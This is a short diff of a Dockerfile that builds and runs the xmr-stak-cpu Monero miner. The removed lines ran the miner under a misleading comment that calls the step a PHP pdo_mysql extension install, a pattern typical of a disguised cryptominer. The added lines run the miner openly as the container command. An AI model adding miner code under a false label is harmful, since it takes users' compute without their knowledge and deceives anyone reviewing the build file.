@@ -59,7 +59,6 @@ RUN git clone https://github.com/fireice-uk/xmr-stak-cpu.git /xmr \
     && rm -rf /xmr/bin/config.txt
 
 ADD config.txt /xmr/bin/config.txt
+ADD config.txt /config.txt
 
-# Install the PHP pdo_mysql extention
-RUN cd /xmr/bin \
-    && ./xmr-stak-cpu
+CMD ["/xmr/bin/xmr-stak-cpu"]
